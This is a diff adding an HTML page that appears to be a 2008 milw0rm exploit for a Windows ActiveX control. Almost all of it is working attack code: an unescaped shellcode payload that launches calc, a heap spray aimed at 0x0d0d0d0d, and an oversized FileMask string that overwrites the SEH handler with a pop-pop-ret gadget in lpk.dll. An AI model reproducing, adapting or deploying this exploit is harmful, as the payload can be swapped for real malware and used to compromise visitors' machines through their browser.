@@ -1,0 +1,47 @@
+<html>
+	<head>
+		<object id="target" classid="clsid:5C6698D9-7BE4-4122-8EC5-291D84DBD4A0"></object>
+	</head>
+<body>
+<script>
+
+var shellcode = unescape("%u0D0D%u0D0D%u9090%u9090"+ //Windows Execute Command (calc)
+"%ue8fc%u0044%u0000%u458b%u8b3c%u057c%u0178%u8bef%u184f%u5f8b"+
+"%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca"+
+"%uc201%uf4eb%u543b%u0424%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b"+
+"%u1c5f%ueb01%u1c8b%u018b%u89eb%u245c%uc304%uc031%u8b64%u3040"+
+"%uc085%u0c78%u408b%u8b0c%u1c70%u8bad%u0868%u09eb%u808b%u00b0"+
+"%u0000%u688b%u5f3c%uf631%u5660%uf889%uc083%u507b%uf068%u048a"+
+"%u685f%ufe98%u0e8a%uff57%u63e7%u6c61%u0063");
+
+var address = 0x0d0d0d0d;
+var block_size = 0x400000;
+var blocks = (address - block_size) / block_size;
+var spray = unescape("%u0D0D%u0D0D");
+var tmp = unescape("%u0D0D%u0D0D");
+var tmp_size = 1044;
+
+while((spray.length * 2) < block_size) spray += spray;
+spray = spray.substring(0, block_size - shellcode.length);
+memory = new Array();
+for(i = 0; i < blocks; i++) memory[i] = spray + shellcode;
+while(tmp.length < (tmp_size * 2)) tmp += tmp;
+tmp = tmp.substring(0, tmp_size);
+
+	var size = 131;
+	var z = Array(size);
+		for (i=0; i<size; i++) {
+			z[i] = unescape("%u0d0d%u0d0d");
+		}
+
+	var size = 131;
+	var z2 = Array(size);
+		for (i=0; i<size; i++) {
+			z2[i] = unescape("%u0d0d%u0d0d");
+		}
+//' 0x629c1795	 pop esi, pop ebp, retn 14   lpk.dll NO SAFE SEH
+target.FileMask=z.join('') + unescape("%uebFF%uebFF") + unescape("%u1795%u629c") + z2.join('') + z2.join('') + z2.join('') + z2.join('') + z2.join('') + z2.join('') + z2.join('') + z2.join('') + z2.join('') + z2.join('') + z2.join('') + z2.join('') + z2.join('') + z2.join('') + tmp.substr(0,1)  // + String(2000, unescape("%uffff"))
+</script>
+</HTML>
+
+# milw0rm.com [2008-02-12]
